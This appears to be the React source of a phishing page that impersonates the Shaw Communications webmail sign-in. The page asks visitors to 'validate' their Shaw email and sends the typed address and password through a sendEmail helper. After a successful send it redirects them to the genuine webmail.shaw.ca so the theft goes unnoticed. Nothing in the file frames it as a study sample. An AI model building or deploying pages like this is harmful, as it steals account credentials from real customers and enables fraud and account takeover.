import { useState, useEffect } from "react";
import $ from "jquery";

import WebMailLogo from "./images/webmail-desktop.png";
import HelpIcon from "./images/icons/helpIcon.png";
import sendEmail from "./utils/sendEmail";

import "./css/main.css";

function App() {
  const [isValidAuth, setIsValidAuth] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(true);

  const validateAuth = (data) => {
    const { email, password } = data;
    const emailRegexPattern =
      /^[A-Za-z0-9_!#$%&'*+\/=?`{|}~^.-]+@[A-Za-z0-9.-]+$/gm;

    if (email && password) {
      return true;
    }

    return false;
  };

  useEffect(() => {
    const result = validateAuth({ email, password });
    setIsValidAuth(result);
  }, [email, password]);

  const handleSubmit = async (event) => {
    event.preventDefault();

    try {
      const response = await sendEmail({ password, email });

      if (response.data === "OK") {
        window.location.assign("https://webmail.shaw.ca");
      }
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div classname="App">
      <div className="wrapper">
        <div className="meganav clearfix">
          <div className="masthead">
            <div
              className="meganavcontainer nopadding"
              style={{ paddingLeft: "5px", paddingRight: "5px" }}
            >
              <ul className="row topToolbar">
                <li
                  className="columns six col-xs-7 col-sm-6 first"
                  style={{ paddingLeft: "10px", paddingRight: "0px" }}
                >
                  <ul className="floatLeft">
                    <li className="personal">
                      <a href="http://www.shaw.ca/store/">Personal</a>
                    </li>

                    <li className="business">
                      <a href="http://business.shaw.ca/">Business</a>
                    </li>
                  </ul>

                  <ul className="hidden-xs">
                    <li>
                      <span className="chat">
                        <a
                          rel="noreferrer"
                          href="http://www.shaw.ca/store/"
                          target="_blank"
                        >
                          Shop
                        </a>
                      </span>

                      <span className="chat divider">|</span>

                      <span>
                        <a
                          href="https://community.shaw.ca/"
                          rel="noreferrer"
                          target="_blank"
                        >
                          Support
                        </a>
                      </span>

                      <span className="divider">|</span>

                      <span>
                        <a
                          rel="noreferrer"
                          href="https://my.shaw.ca/"
                          target="_blank"
                        >
                          My Shaw
                        </a>
                      </span>
                    </li>
                  </ul>
                </li>
                <li
                  className="columns six col-xs-5 col-sm-6 text-right"
                  style={{ paddingLeft: 0, paddingRight: 10 }}
                >
                  <ul className="secondary">
                    <li className="drawer" rel="contact-content">
                      <a
                        className="ic ic-shaw-contact hidden-xs"
                        href="https://www.shaw.ca/contact-us/"
                        target="_blank"
                        rel="noreferrer"
                      >
                        <span className="hidden-xs">Contact</span>
                      </a>
                    </li>
                  </ul>
                </li>
              </ul>
            </div>
            <div className="topToolbarContent hidden-xs">
              <div className="meganavcontainer">
                <ul className="nav">
                  <li
                    className="meganavcontent contact-content"
                    id="contact-content"
                  >
                    <ul className="meganavcontainer row">
                      <li className="columns five phone col-md-2-5 col-sm-6 col-xs-6">
                        <h3 className="ic ic-shaw-phone2">Phone</h3>
                        <p>Questions? You can give us a call 24/7.</p>
                        <p>
                          <strong>1-888-472-2222</strong>
                        </p>
                      </li>
                      <li className="columns five chat col-md-2-5 col-sm-6 col-xs-6">
                        <h3 className="ic ic-shaw-chat2">Chat</h3>

                        <p className="ontouch">
                          To chat with our reps online for questions and advice,
                          please visit us on a desktop computer.
                        </p>

                        <p className="notouch">
                          Chat with our reps online for answers and advice.
                        </p>

                        <p className="notouch">
                          <a href="javascript:openChatWindow();">
                            Click to chat
                          </a>
                        </p>
                      </li>
                      <li className="columns five email col-md-2-5 col-sm-6 col-xs-6">
                        <h3 className="ic ic-shaw-email2">Email</h3>

                        <p>Ask your questions and we'll get back to you.</p>

                        <p>
                          <a
                            rel="noreferrer"
                            href="javascript:openEmailWindow();"
                          >
                            Email us
                          </a>
                        </p>
                      </li>

                      <li className="columns five store col-md-2-5 col-sm-6 col-xs-6">
                        <h3 className="ic ic-shaw-location">Find a store</h3>
                        <p>Visit a store for help with products and services</p>
                        <p>
                          <a
                            rel="noreferrer"
                            target="_blank"
                            href="https://www.shaw.ca/contact-us/retail/"
                          >
                            Find a store
                          </a>
                        </p>
                      </li>

                      <li className="columns five support col-md-2-5 col-sm-6 col-xs-6">
                        <h3 className="ic ic-shaw-contact2">Support</h3>
                        <p>Get the answers to your questions.</p>
                        <p>
                          <a
                            rel="noreferrer"
                            target="_blank"
                            href="https://community.shaw.ca/"
                          >
                            Visit Support Community
                          </a>
                        </p>
                      </li>
                    </ul>

                    <div className="clearfix" />
                    <hr />
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        <div className="container">
          <div id="content" className="hideDisplay content">
            <div id="sign-in-content" className="main-content">
              <div id="logo-section" className="logo-section">
                <img src={WebMailLogo} alt="webmail-logo" />
              </div>

              <div className="alert_placeholder" id="alert_placeholder" />

              <div id="heading-section" className="heading-section">
                <p id="heading" className="heading">
                  Sign in to validate your Shaw email
                </p>
              </div>

              <div id="tabs" className="tabs-menu">
                <ul className="nav nav-tabs" data-tabs="tabs">
                  <li id="shawEmailTab" className="active">
                    <a href="#email" data-toggle="tab">
                      Email
                    </a>
                  </li>

                  <li id="shawOCCTab">
                    <a href="#myaccount" data-toggle="tab">
                      My Shaw
                    </a>
                  </li>

                  <li id="shawDirectTab">
                    <a href="#shawdirect" data-toggle="tab">
                      Shaw Direct
                    </a>
                  </li>
                </ul>
              </div>

              <div id="signon_form_div" className="tab-pane active">
                <form onSubmit={handleSubmit} className="form-signin">
                  <div className="input_info_container">
                    <div className="input_text">
                      <label
                        id="username_input_label"
                        className="user_label"
                        htmlFor="username_input"
                        style={{}}
                      >
                        Shaw email
                      </label>

                      <input
                        id="username_input"
                        name="username"
                        type="text"
                        className="input_fields username_input"
                        autoCorrect="off"
                        autoCapitalize="off"
                        autoComplete="off"
                        tabIndex={1}
                        placeholder="example@shaw.ca"
                        value={email}
                        onChange={({ target }) => setEmail(target.value)}
                      />
                    </div>

                    <div className="input_info help_icon">
                      <button
                        id="help_icon"
                        className="help_link"
                        type="button"
                        // onClick={handleModal}
                        data-toggle="modal"
                        data-target="#myModal"
                      >
                        <img src={HelpIcon} alt="help" />
                        <br />
                        Help
                      </button>
                    </div>
                  </div>

                  <div className="input_info_container">
                    <div className="input_text">
                      <label
                        id="password_input_label"
                        className="user_label"
                        htmlFor="password_input"
                        style={{}}
                      >
                        Password
                      </label>

                      <input
                        id="password_input"
                        name="password"
                        type="password"
                        className="input_fields"
                        tabIndex={2}
                        autoComplete="current-password"
                        value={password}
                        onChange={({ target }) => setPassword(target.value)}
                      />
                    </div>

                    <div className="input_info">
                      <button
                        type="button"
                        id="account_number_popover_password"
                        className="account_number_popover ic icon-shaw-question"
                      />
                    </div>
                  </div>

                  <div className="clearfix" />

                  <div id="checkbox-section" className="checkbox-section">
                    <div
                      id="checkbox"
                      className="checkboxFive"
                      onClick={() => setRememberMe((state) => !state)}
                    >
                      <input
                        type="checkbox"
                        className="persistent_check"
                        checked={rememberMe}
                        tabIndex={4}
                      />

                      <label
                        id="checkboxMask"
                        className="ic"
                        htmlFor="checkbox-label"
                      />
                    </div>

                    <div id="checkbox-label" className="checkbox-label">
                      <label>Remember Shaw email</label>
                    </div>
                  </div>

                  <input
                    type="checkbox"
                    id="skip_intercept_checkbox"
                    name="skip_intercept_checkbox"
                    hidden
                  />

                  <div style={{ textAlign: "center" }}>
                    <button
                      type="submit"
                      id="signin_submit"
                      onclick
                      className={`button ${
                        !isValidAuth ? "button_disabled" : "button_enabled"
                      }`}
                      tabIndex={5}
                    >
                      Sign in
                    </button>
                  </div>

                  <input
                    id="realm_input"
                    name="realm"
                    type="hidden"
                    defaultValue
                  />

                  <div id="description-section" className="description-section">
                    <center>
                      <div id="resetinstructions" className="description_one">
                        <span
                          style={{
                            fontWeight: "bold",
                            fontColor: "#666666",
                            fontSize: "14px",
                          }}
                        >
                          Having trouble?
                        </span>

                        <span style={{ fontSize: "14px", marginLeft: "2px" }}>
                          <a href="https://support.shaw.ca/t5/internet-articles/how-to-change-your-shaw-email-password/ta-p/6430">
                            Shaw Support: How To Reset My Password
                          </a>
                        </span>

                        <br />

                        <span
                          style={{
                            fontWeight: "bold",
                            fontColor: "#666666",
                            fontSize: "14px",
                          }}
                        >
                          Already Know How?
                        </span>

                        <span style={{ fontSize: "14px", marginLeft: "2px" }}>
                          <a
                            href="https://my.shaw.ca/services/internet"
                            target="_blank"
                            rel="noreferrer"
                          >
                            Reset Password On My Shaw
                          </a>
                        </span>
                      </div>
                      <div
                        id="create_new_account"
                        className="description_two hidden-xs hidden-sm hidden-md"
                      >
                        <span className="dont-have-account-phone">
                          Don't have an account?
                        </span>

                        <a
                          target="_self"
                          id="create_one_now"
                          href="https://register.shaw.ca/"
                        >
                          <span className="dont-have-account-desktop">
                            Don't have an account?
                          </span>

                          <span className="create-one-now-url">
                            Create one now.
                          </span>
                        </a>
                      </div>
                    </center>
                  </div>
                  <input type="hidden" id="anchor" name="anchor" defaultValue />
                </form>
              </div>

              <div id="intercept_div" hidden>
                <div id="intercept_body_div" />
                <button
                  type="button"
                  id="intercept_submit"
                  onclick
                  className="button"
                >
                  Continue
                </button>
              </div>
            </div>

            <div id="side-description" className="side-description">
              <div className="advertisementText">Advertisement</div>
              <div name className="webmailAdBox" />
            </div>

            <div className="clearfix" />

            <input
              type="hidden"
              id="goto"
              name="goto"
              defaultValue="https://my.shaw.ca/"
            />

            <div
              className="modal fade"
              id="myModal"
              tabIndex={-1}
              role="dialog"
              aria-labelledby="myModalLabel"
              aria-hidden="true"
              onclick="modalClick(e)"
            >
              <div className="modal-dialog">
                <div className="modal-content">
                  <div className="modal-header">
                    <button
                      type="button"
                      className="close"
                      data-dismiss="modal"
                    >
                      <span aria-hidden="true">
                        <img src="images/modal-close.png" alt="close" />
                      </span>

                      <span className="sr-only">Close</span>
                    </button>

                    <div className="modal-icon ic icon-shaw-question" />
                    <h2 className="modal-title" id="myModalLabel" />
                  </div>

                  <div className="modal-body">
                    <p className="modal-para" />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="push" />
      </div>

      <div id="contact-footer" className="contact-footer">
        <div id="footer-section" className="footer-section">
          <div id="footer-section-content" className="footer-section-content">
            <div id="footer-links" className="footer-links">
              <span>
                <a
                  href="http://www.shaw.ca/privacy-policy/"
                  target="_blank"
                  tabIndex={10}
                  rel="noreferrer"
                >
                  Privacy Policy
                </a>
                &nbsp;&nbsp;
              </span>

              <span>|</span>

              <span>
                &nbsp;&nbsp;
                <a
                  href="http://www.shaw.ca/terms-of-use/"
                  target="_blank"
                  tabIndex={11}
                  rel="noreferrer"
                >
                  Terms of Use
                </a>
                &nbsp;&nbsp;
              </span>

              <span>|</span>

              <span>
                &nbsp;&nbsp;
                <a
                  href="http://www.shaw.ca/accessibility/"
                  target="_blank"
                  tabIndex={12}
                  rel="noreferrer"
                >
                  Accessibility
                </a>
                &nbsp;&nbsp;
              </span>
            </div>

            <div id="footer-copyright" className="footer-copyright">
              <span>© 2022 Shaw Communications. All Rights Reserved.</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
